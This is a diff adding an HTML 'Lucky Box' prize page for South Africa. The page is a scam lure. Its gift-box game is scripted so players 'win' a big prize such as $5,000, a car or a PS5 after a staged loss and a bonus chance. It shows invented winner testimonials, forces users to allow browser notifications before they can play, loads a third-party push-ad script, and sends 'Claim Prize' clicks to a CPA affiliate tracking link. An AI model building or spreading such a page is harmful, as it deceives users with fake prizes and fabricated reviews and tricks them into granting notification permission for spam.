@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <script>
+var pm_tag = 'SAspin2026';
+var pm_pid = "26212-c8a83c6c";
+</script>
+<script src="https://leads.leadseagle.shop/js/pub.min.js" async></script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>South Africa - Lucky Box</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .box-container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 900px;
+            width: 100%;
+            box-shadow: 0 10px 40px rgba(240,165,0,0.3);
+        }
+        .box-title {
+            text-align: center;
+            font-size: 2.2em;
+            color: #111;
+            margin-bottom: 8px;
+            font-weight: bold;
+            -webkit-text-stroke: 1.5px #f0a500;
+        }
+        .box-subtitle {
+            text-align: center;
+            font-size: 1.25em;
+            color: #111;
+            margin-bottom: 15px;
+            font-weight: 700;
+            -webkit-text-stroke: 0.8px #f0a500;
+        }
+        
+.south-africa-flag{
+    width:100%;
+    height:90px;
+    margin-bottom:20px;
+    border-radius:10px;
+    overflow:hidden;
+    box-shadow:0 4px 15px rgba(0,0,0,.25);
+    position:relative;
+    background:#fff;
+}
+/* South Africa flag: red top, blue bottom, green Y with white/gold borders */
+.south-africa-flag::before{
+    content:"";
+    position:absolute;
+    inset:0;
+    background:
+      linear-gradient(33deg, transparent 0 34%, #fff 34% 39%, #ffb81c 39% 43%, #007749 43% 56%, #ffb81c 56% 60%, #fff 60% 65%, transparent 65%),
+      linear-gradient(147deg, transparent 0 34%, #fff 34% 39%, #ffb81c 39% 43%, #007749 43% 56%, #ffb81c 56% 60%, #fff 60% 65%, transparent 65%),
+      linear-gradient(to bottom,#de3831 0 50%,#002395 50% 100%);
+}
+.south-africa-flag::after{
+    content:"";
+    position:absolute;
+    left:0;
+    top:0;
+    width:42%;
+    height:100%;
+    background:#000;
+    clip-path:polygon(0 0,100% 50%,0 100%);
+}
+
+        .attempts {
+            text-align: center;
+            font-size: 1.05em;
+            color: #111;
+            font-weight: 700;
+            margin-bottom: 25px;
+            padding: 12px;
+            background: linear-gradient(135deg, #f0a500, #ffd700);
+            border-radius: 10px;
+            border: 2px solid #111;
+        }
+        .boxes-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 22px;
+            margin-bottom: 40px;
+            padding: 10px;
+        }
+        @media (max-width: 600px) {
+            .boxes-grid { grid-template-columns: repeat(3, 1fr); gap: 14px; }
+        }
+        .gift-box {
+            cursor: pointer;
+            position: relative;
+            width: 100%;
+            padding-bottom: 110%;
+        }
+        .gift-box-inner {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.3s ease;
+        }
+        .gift-box:hover:not(.opened) .gift-box-inner { transform: translateY(-8px) scale(1.05); }
+        .gift-box.opened { cursor: not-allowed; }
+        .box-3d { width: 85%; height: 85%; position: relative; }
+        .box-bottom {
+            position: absolute;
+            bottom: 0; left: 5%;
+            width: 90%; height: 70%;
+            background: linear-gradient(135deg, #c8860a, #f5c518, #e8a010, #b87800);
+            border-radius: 4px 4px 6px 6px;
+            box-shadow: 6px 8px 0 rgba(0,0,0,0.4), inset 2px 2px 8px rgba(255,220,80,0.4);
+        }
+        .box-bottom::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: repeating-linear-gradient(45deg, transparent, transparent 8px, rgba(255,200,50,0.1) 8px, rgba(255,200,50,0.1) 16px);
+            border-radius: inherit;
+        }
+        .box-bottom::after {
+            content: '';
+            position: absolute;
+            right: -7px; top: 3px;
+            width: 7px; height: 100%;
+            background: linear-gradient(180deg, #a06800, #8a5500);
+            border-radius: 0 3px 3px 0;
+        }
+        .ribbon-v {
+            position: absolute;
+            width: 18%; left: 41%; top: 0; height: 100%;
+            background: linear-gradient(180deg, #111, #333, #111);
+            z-index: 2;
+        }
+        .ribbon-h {
+            position: absolute;
+            height: 18%; top: 41%; left: 0; width: 100%;
+            background: linear-gradient(90deg, #111, #333, #111);
+            z-index: 2;
+        }
+        .box-lid {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 28%;
+            background: linear-gradient(135deg, #d4920c, #f5c518, #eca00e, #c48200);
+            border-radius: 6px 6px 2px 2px;
+            box-shadow: 6px 5px 0 rgba(0,0,0,0.35);
+            transform-origin: top center;
+            transition: transform 0.7s cubic-bezier(0.4,0,0.2,1);
+            z-index: 3;
+        }
+        .box-lid::after {
+            content: '';
+            position: absolute;
+            right: -7px; top: 2px;
+            width: 7px; height: 100%;
+            background: linear-gradient(180deg, #b07200, #956000);
+            border-radius: 0 3px 0 0;
+        }
+        .gift-box.opened .box-lid { transform: rotateX(140deg) translateY(-10px); }
+        .bow {
+            position: absolute;
+            top: -18%; left: 50%;
+            transform: translateX(-50%);
+            font-size: 2em;
+            z-index: 5;
+            transition: all 0.7s ease;
+            filter: sepia(1) saturate(3) hue-rotate(5deg) drop-shadow(0 0 3px #000);
+        }
+        .gift-box.opened .bow {
+            transform: translateX(-50%) translateY(-30px) rotateX(140deg);
+            opacity: 0.2;
+        }
+        .box-number {
+            position: absolute;
+            bottom: 4px; right: 4px;
+            background: rgba(255,255,255,0.95);
+            color: #333;
+            width: 22px; height: 22px;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: bold; font-size: 0.65em;
+            z-index: 6;
+        }
+        .box-content {
+            position: absolute;
+            width: 90%; top: 30%; left: 5%;
+            display: none;
+            align-items: center; justify-content: center;
+            z-index: 7;
+        }
+        .gift-box.opened .box-content { display: flex; }
+        .box-content-text {
+            background: rgba(255,255,255,0.97);
+            padding: 4px 6px; border-radius: 6px;
+            font-weight: bold; text-align: center;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.3);
+            max-width: 95%; font-size: 0.62em; line-height: 1.3;
+            animation: popUp 0.5s ease;
+        }
+        .box-content.lose .box-content-text { color: #e74c3c; font-size: 0.75em; }
+        .box-content.win .box-content-text { color: #c8860a; }
+        @keyframes popUp {
+            0% { transform: scale(0); opacity: 0; }
+            60% { transform: scale(1.2); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .prize-popup {
+            position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            display: none; justify-content: center; align-items: center;
+            z-index: 9999;
+        }
+        .prize-popup.active { display: flex; }
+        .prize-content {
+            background: linear-gradient(135deg, #fff9e6, #ffffff);
+            border-radius: 24px; padding: 40px; max-width: 520px; width: 92%;
+            text-align: center; animation: slideUp 0.5s ease;
+            border: 3px solid #f0a500;
+            box-shadow: 0 0 60px rgba(240,165,0,0.5);
+            position: relative; overflow: hidden;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(60px) scale(0.8); opacity: 0; }
+            to { transform: translateY(0) scale(1); opacity: 1; }
+        }
+        .prize-content h2 { font-size: 2.2em; color: #c8860a; margin-bottom: 10px; }
+        .prize-icon { font-size: 5em; margin: 15px 0; animation: bounce 0.6s infinite alternate; }
+        @keyframes bounce { from { transform: scale(1); } to { transform: scale(1.15); } }
+        .prize-text {
+            font-size: 1.4em; color: #333; margin-bottom: 25px;
+            padding: 15px; background: linear-gradient(135deg, #fff3cc, #ffe680);
+            border-radius: 12px; border: 2px solid #f0a500; font-weight: bold;
+        }
+        .claim-btn {
+            background: linear-gradient(135deg, #f0a500, #c8860a);
+            color: white; border: none;
+            padding: 15px 45px; font-size: 1.2em; font-weight: bold;
+            border-radius: 50px; cursor: pointer;
+            box-shadow: 0 5px 20px rgba(200,134,10,0.5);
+            transition: all 0.3s ease;
+        }
+        .claim-btn:hover { transform: translateY(-3px) scale(1.05); }
+        .confetti-piece {
+            position: absolute; border-radius: 2px;
+            animation: confettiFall 1.5s ease-in forwards;
+        }
+        @keyframes confettiFall {
+            0% { transform: translateY(-20px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(500px) rotate(720deg); opacity: 0; }
+        }
+        .bonus-popup {
+            position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.88);
+            display: none; justify-content: center; align-items: center;
+            z-index: 9998;
+        }
+        .bonus-popup.active { display: flex; }
+        .bonus-content {
+            background: linear-gradient(135deg, #fff9e6, #ffffff);
+            border-radius: 24px; padding: 40px; max-width: 480px; width: 92%;
+            text-align: center; animation: slideUp 0.5s ease;
+            border: 3px solid #f0a500; box-shadow: 0 0 40px rgba(240,165,0,0.4);
+        }
+        .bonus-content h2 { font-size: 2em; color: #c8860a; margin-bottom: 10px; }
+        .bonus-icon { font-size: 4em; margin: 15px 0; }
+        .bonus-text { font-size: 1.2em; color: #333; margin-bottom: 25px; padding: 12px; background: #fff3cc; border-radius: 10px; border: 2px solid #f0a500; }
+        .bonus-btn {
+            background: linear-gradient(135deg, #f0a500, #c8860a);
+            color: white; border: none;
+            padding: 14px 40px; font-size: 1.1em; font-weight: bold;
+            border-radius: 50px; cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .bonus-btn:hover { transform: translateY(-2px); }
+        .comments-section { margin-top: 40px; padding-top: 30px; border-top: 2px solid #f0f0f0; }
+        .comments-title { font-size: 1.5em; color: #333; margin-bottom: 20px; font-weight: 600; text-align: center; }
+        .comment {
+            background: #f9f9f9; padding: 15px; border-radius: 12px;
+            margin-bottom: 15px; display: flex; align-items: flex-start;
+            gap: 12px; border-left: 4px solid #f0a500;
+        }
+        .comment-avatar { width: 48px; height: 48px; border-radius: 50%; object-fit: cover; flex-shrink: 0; border: 2px solid #f0a500; }
+        .comment-body { flex: 1; }
+        .comment-header { display: flex; align-items: center; gap: 8px; margin-bottom: 5px; flex-wrap: wrap; }
+        .comment-name { font-weight: bold; color: #333; font-size: 0.95em; }
+        .comment-badge { font-size: 0.72em; padding: 2px 8px; border-radius: 20px; font-weight: 600; color: white; }
+        .badge-airpods { background: #3498db; }
+        .badge-watch   { background: #9b59b6; }
+        .badge-ps5     { background: #e74c3c; }
+        .badge-money   { background: #27ae60; }
+        .badge-car     { background: #e67e22; }
+        .badge-gb      { background: #2980b9; }
+        .comment-text { color: #555; font-size: 0.9em; line-height: 1.5; }
+        .comment-time { color: #aaa; font-size: 0.78em; margin-top: 4px; }
+    
+.notification-gate{
+    position:fixed;
+    inset:0;
+    z-index:10000;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:rgba(0,0,0,.88);
+    padding:20px;
+}
+.notification-card{
+    max-width:420px;
+    width:100%;
+    background:#fff;
+    color:#111;
+    border-radius:20px;
+    padding:28px;
+    text-align:center;
+    box-shadow:0 15px 50px rgba(0,0,0,.5);
+}
+.notification-card h2{margin:0 0 10px;color:#111}
+.notification-card p{color:#444;line-height:1.5}
+.notification-btn{
+    width:100%;
+    border:0;
+    border-radius:12px;
+    padding:15px;
+    background:#111;
+    color:#fff;
+    font-size:16px;
+    font-weight:bold;
+    cursor:pointer;
+}
+.notification-status{
+    margin-top:12px;
+    font-size:13px;
+    color:#777;
+}
+.game-locked{
+    pointer-events:none;
+    user-select:none;
+    opacity:.55;
+}
+
+</style>
+</head>
+<body>
+
+<div class="notification-gate" id="notificationGate">
+    <div class="notification-card">
+        <div style="font-size:48px">🔔</div>
+        <h2>Enable Notifications</h2>
+        <p>Enable browser notifications to continue and open the Lucky Boxes.</p>
+        <button class="notification-btn" id="enableNotificationsBtn" type="button">
+            🔔 Enable Notifications
+        </button>
+        <div class="notification-status" id="notificationStatus">
+            Notifications are required to continue.
+        </div>
+    </div>
+</div>
+
+<div class="box-container">
+    <div class="box-title">🎁 Lucky Box 🎁</div>
+    <div class="box-subtitle">Choose a box and discover your prize!</div>
+    <div class="south-africa-flag" role="img" aria-label="Flag of South Africa"></div>
+    <div class="attempts" id="attemptsInfo">Attempts remaining: <strong>3</strong></div>
+    <div class="boxes-grid game-locked" id="boxesGrid"></div>
+    <div class="comments-section">
+        <div class="comments-title">💬 Recent Winners</div>
+        <div class="comment"><img class="comment-avatar" src="https://i.pravatar.cc/100?img=1" alt="avatar"><div class="comment-body"><div class="comment-header"><span class="comment-name">María González</span></div><div class="comment-text">I can't believe it! I won free data 😍</div><div class="comment-time">2 hours ago</div></div></div>
+        <div class="comment"><img class="comment-avatar" src="https://i.pravatar.cc/100?img=5" alt="avatar"><div class="comment-body"><div class="comment-header"><span class="comment-name">Carlos Ramírez</span></div><div class="comment-text">Amazing promotion, I won unlimited minutes 🎉</div><div class="comment-time">5 hours ago</div></div></div>
+        <div class="comment"><img class="comment-avatar" src="https://i.pravatar.cc/100?img=9" alt="avatar"><div class="comment-body"><div class="comment-header"><span class="comment-name">Ana Martínez</span></div><div class="comment-text">Muy buena dinámica, gané recarga gratis 💚</div><div class="comment-time">1 day ago</div></div></div>
+        <div class="comment"><img class="comment-avatar" src="https://i.pravatar.cc/100?img=12" alt="avatar"><div class="comment-body"><div class="comment-header"><span class="comment-name">Luis Hernández</span></div><div class="comment-text">¡Excelente! Gané plan mensual gratis 🙌</div><div class="comment-time">2 days ago</div></div></div>
+        <div class="comment"><img class="comment-avatar" src="https://i.pravatar.cc/100?img=20" alt="avatar"><div class="comment-body"><div class="comment-header"><span class="comment-name">Sofía López</span></div><div class="comment-text">Muy fácil de participar y gané datos extra 📱</div><div class="comment-time">3 days ago</div></div></div>
+        <div class="comment"><img class="comment-avatar" src="https://i.pravatar.cc/100?img=33" alt="avatar"><div class="comment-body"><div class="comment-header"><span class="comment-name">Jorge Pérez</span></div><div class="comment-text">¡Qué sorpresa! Gané recarga de $100 😄</div><div class="comment-time">4 days ago</div></div></div>
+        <div class="comment"><img class="comment-avatar" src="https://i.pravatar.cc/100?img=47" alt="avatar"><div class="comment-body"><div class="comment-header"><span class="comment-name">Valentina Cruz</span><span class="comment-badge badge-airpods">🎧 Ganó AirPods</span></div><div class="comment-text">¡Gané unos AirPods! 🎧 ¡Gracias América Móvil!</div><div class="comment-time">6 hours ago</div></div></div>
+        <div class="comment"><img class="comment-avatar" src="https://i.pravatar.cc/100?img=60" alt="avatar"><div class="comment-body"><div class="comment-header"><span class="comment-name">Rodrigo Fuentes</span><span class="comment-badge badge-watch">⌚ Ganó Smart Watch</span></div><div class="comment-text">Increíble, gané un Smart Watch ⌚ ¡100% recomendado!</div><div class="comment-time">12 hours ago</div></div></div>
+        <div class="comment"><img class="comment-avatar" src="https://i.pravatar.cc/100?img=68" alt="avatar"><div class="comment-body"><div class="comment-header"><span class="comment-name">Diego Morales</span><span class="comment-badge badge-ps5">🎮 Ganó PS5</span></div><div class="comment-text">¡Gané una PS5! 🎮🔥 ¡Esto es real!</div><div class="comment-time">1 day ago</div></div></div>
+        <div class="comment"><img class="comment-avatar" src="https://i.pravatar.cc/100?img=75" alt="avatar"><div class="comment-body"><div class="comment-header"><span class="comment-name">Isabella Vargas</span><span class="comment-badge badge-money">💵 Ganó $5,000</span></div><div class="comment-text">¡Gané $5,000 dólares! 💵🤩</div><div class="comment-time">3 hours ago</div></div></div>
+        <div class="comment"><img class="comment-avatar" src="https://i.pravatar.cc/100?img=52" alt="avatar"><div class="comment-body"><div class="comment-header"><span class="comment-name">Alejandro Torres</span><span class="comment-badge badge-car">🚗 Ganó Auto 2026</span></div><div class="comment-text">¡Me gané un auto 2026! 🚗✨</div><div class="comment-time">8 hours ago</div></div></div>
+        <div class="comment"><img class="comment-avatar" src="https://i.pravatar.cc/100?img=44" alt="avatar"><div class="comment-body"><div class="comment-header"><span class="comment-name">Camila Reyes</span><span class="comment-badge badge-gb">📶 Ganó 10GB</span></div><div class="comment-text">¡Gané 10GB de datos! 📶😍</div><div class="comment-time">5 hours ago</div></div></div>
+    </div>
+</div>
+<!-- بوب أب الفوز -->
+<div class="prize-popup" id="prizePopup">
+    <div class="prize-content" id="prizeContent">
+        <h2>🎉 Congratulations!</h2>
+        <div class="prize-icon" id="popupIcon">🎁</div>
+        <div class="prize-text" id="popupText"></div>
+        <button class="claim-btn" onclick="claimPrize()">Claim Prize!</button>
+    </div>
+</div>
+
+<!-- بوب أب المحاولة الزيادة -->
+<div class="bonus-popup" id="bonusPopup">
+    <div class="bonus-content">
+        <h2>🎊 Extra Chance!</h2>
+        <div class="bonus-icon">🎰</div>
+        <div class="bonus-text">You have an extra chance! Choose another box.</div>
+        <button class="bonus-btn" onclick="closeBonusPopup()">Keep Playing!</button>
+    </div>
+</div>
+
+
+<script>
+(function(){
+    const gate = document.getElementById('notificationGate');
+    const btn = document.getElementById('enableNotificationsBtn');
+    const status = document.getElementById('notificationStatus');
+    const grid = document.getElementById('boxesGrid');
+
+    function isGranted(){
+        return ('Notification' in window) &&
+               Notification.permission === 'granted';
+    }
+
+    function unlock(){
+        gate.style.display = 'none';
+        grid.classList.remove('game-locked');
+    }
+
+    function lock(message){
+        gate.style.display = 'flex';
+        status.textContent = message;
+        grid.classList.add('game-locked');
+    }
+
+    function checkPermission(){
+        if (!('Notification' in window)) {
+            lock('This browser does not support notifications.');
+            btn.disabled = true;
+            btn.style.opacity = '.5';
+            return;
+        }
+
+        if (isGranted()) {
+            unlock();
+            return;
+        }
+
+        if (Notification.permission === 'denied') {
+            lock('Notifications are blocked. Allow notifications for this site in your browser settings, then reload the page.');
+            return;
+        }
+
+        lock('Notifications are required to continue.');
+    }
+
+    btn.addEventListener('click', async function(){
+        if (!('Notification' in window)) return;
+
+        try {
+            const permission = await Notification.requestPermission();
+
+            if (permission === 'granted') {
+                status.textContent = 'Notifications enabled.';
+                unlock();
+            } else if (permission === 'denied') {
+                lock('Notifications were blocked. Allow them in your browser settings to continue.');
+            } else {
+                lock('Please allow notifications to continue.');
+            }
+        } catch(e) {
+            lock('Could not request notification permission. Please try again.');
+        }
+    });
+
+    checkPermission();
+})();
+</script>
+
+<script>
+const bigPrizes = [
+        { icon: '💵', text: 'You won $5,000!' },
+        { icon: '🚗', text: 'You won a 2026 car!' },
+        { icon: '🎮', text: 'You won a PS5!' },
+        { icon: '📱', text: 'You won an iPhone 17 Pro Max!' },
+        { icon: '🎧', text: 'You won AirPods!' },
+        { icon: '⌚', text: 'You won a Smart Watch!' },
+        { icon: '📶', text: 'You won 10GB of data!' },
+    ];
+
+    let attemptNumber = 0;
+    let attemptsLeft = 3;
+    let bonusGiven = false;
+    let currentPrize = null;
+
+    const AudioCtx = window.AudioContext || window.webkitAudioContext;
+    let audioCtx;
+    function getCtx() {
+        if (!audioCtx) audioCtx = new AudioCtx();
+        return audioCtx;
+    }
+
+    function playWinSound() {
+        const ctx = getCtx();
+        [523,659,784,1047].forEach((f,i) => {
+            const o = ctx.createOscillator(), g = ctx.createGain();
+            o.connect(g); g.connect(ctx.destination);
+            o.frequency.value = f; o.type = 'sine';
+            g.gain.setValueAtTime(0.3, ctx.currentTime + i*0.12);
+            g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i*0.12 + 0.4);
+            o.start(ctx.currentTime + i*0.12);
+            o.stop(ctx.currentTime + i*0.12 + 0.4);
+        });
+    }
+
+    function playLoseSound() {
+        const ctx = getCtx();
+        [400,300,200].forEach((f,i) => {
+            const o = ctx.createOscillator(), g = ctx.createGain();
+            o.connect(g); g.connect(ctx.destination);
+            o.frequency.value = f; o.type = 'sawtooth';
+            g.gain.setValueAtTime(0.2, ctx.currentTime + i*0.15);
+            g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i*0.15 + 0.3);
+            o.start(ctx.currentTime + i*0.15);
+            o.stop(ctx.currentTime + i*0.15 + 0.3);
+        });
+    }
+
+    function playBonusSound() {
+        const ctx = getCtx();
+        [600,800,600,1000].forEach((f,i) => {
+            const o = ctx.createOscillator(), g = ctx.createGain();
+            o.connect(g); g.connect(ctx.destination);
+            o.frequency.value = f; o.type = 'triangle';
+            g.gain.setValueAtTime(0.25, ctx.currentTime + i*0.1);
+            g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i*0.1 + 0.25);
+            o.start(ctx.currentTime + i*0.1);
+            o.stop(ctx.currentTime + i*0.1 + 0.25);
+        });
+    }
+
+    function launchConfetti() {
+        const container = document.getElementById('prizeContent');
+        const colors = ['#f0a500','#e74c3c','#3498db','#2ecc71','#9b59b6','#fff'];
+        for (let i = 0; i < 80; i++) {
+            const p = document.createElement('div');
+            p.className = 'confetti-piece';
+            p.style.cssText = `
+                left:${Math.random()*100}%;
+                top:${Math.random()*20}%;
+                background:${colors[Math.floor(Math.random()*colors.length)]};
+                width:${6+Math.random()*8}px;
+                height:${6+Math.random()*8}px;
+                animation-delay:${Math.random()*0.5}s;
+                animation-duration:${1+Math.random()*1}s;
+            `;
+            container.appendChild(p);
+            setTimeout(() => p.remove(), 2500);
+        }
+    }
+
+    function buildBoxes() {
+        const grid = document.getElementById('boxesGrid');
+        grid.innerHTML = '';
+        for (let i = 0; i < 12; i++) {
+            const box = document.createElement('div');
+            box.className = 'gift-box';
+            box.dataset.index = i;
+            box.innerHTML = `
+                <div class="gift-box-inner">
+                    <div class="box-3d">
+                        <div class="box-bottom">
+                            <div class="ribbon-v"></div>
+                            <div class="ribbon-h"></div>
+                        </div>
+                        <div class="box-lid">
+                            <div class="ribbon-v"></div>
+                            <div class="ribbon-h"></div>
+                        </div>
+                        <div class="bow">🎀</div>
+                        <div class="box-number">${i + 1}</div>
+                        <div class="box-content"></div>
+                    </div>
+                </div>
+            `;
+            box.addEventListener('click', () => openBox(box, i));
+            grid.appendChild(box);
+        }
+    }
+
+    function openBox(box, index) {
+        if (box.classList.contains('opened') || attemptsLeft <= 0) return;
+        box.classList.add('opened');
+        attemptNumber++;
+        attemptsLeft--;
+        document.getElementById('attemptsInfo').innerHTML =
+            `Attempts remaining: <strong>${attemptsLeft}</strong>`;
+
+        if (attemptNumber === 1) {
+            showLose(box); playLoseSound(); return;
+        }
+        if (attemptNumber === 2 && !bonusGiven) {
+            bonusGiven = true;
+            showLose(box);
+            setTimeout(() => {
+                playBonusSound();
+                attemptsLeft++;
+                document.getElementById('attemptsInfo').innerHTML =
+                    `Attempts remaining: <strong>${attemptsLeft}</strong>`;
+                document.getElementById('bonusPopup').classList.add('active');
+            }, 900);
+            return;
+        }
+        if (attemptNumber === 3) {
+            if (Math.random() < 0.5) { showLose(box); playLoseSound(); }
+            else showWin(box);
+            return;
+        }
+        showWin(box);
+    }
+
+    function showLose(box) {
+        const el = box.querySelector('.box-content');
+        el.classList.add('lose');
+        el.innerHTML = `<div class="box-content-text">😔<br>No luck!</div>`;
+    }
+
+    function showWin(box) {
+        currentPrize = bigPrizes[Math.floor(Math.random() * bigPrizes.length)];
+        const el = box.querySelector('.box-content');
+        el.classList.add('win');
+        el.innerHTML = `<div class="box-content-text">${currentPrize.icon}<br>${currentPrize.text}</div>`;
+        setTimeout(() => {
+            playWinSound();
+            document.getElementById('popupIcon').textContent = currentPrize.icon;
+            document.getElementById('popupText').textContent = currentPrize.text;
+            document.getElementById('prizePopup').classList.add('active');
+            setTimeout(launchConfetti, 300);
+        }, 700);
+    }
+
+    function closeBonusPopup() {
+        document.getElementById('bonusPopup').classList.remove('active');
+    }
+
+    buildBoxes();
+
+    const CPA_LINK =
+        "https://app.hawktrk.com/sl?id=6a2050db46d3cf0d62f32aa4&pid=2&sub2=u789408&sub6=s2smartLink&sub5=s1SUBID1HERE";
+
+    function claimPrize() {
+        window.location.href = CPA_LINK;
+    }
+</script>
+
+<script>
+document.addEventListener('visibilitychange', function(){
+    if (document.visibilityState === 'visible' &&
+        'Notification' in window &&
+        Notification.permission === 'granted') {
+        const gate=document.getElementById('notificationGate');
+        const grid=document.getElementById('boxesGrid');
+        gate.style.display='none';
+        grid.classList.remove('game-locked');
+    }
+});
+</script>
+
+</body>
+</html>
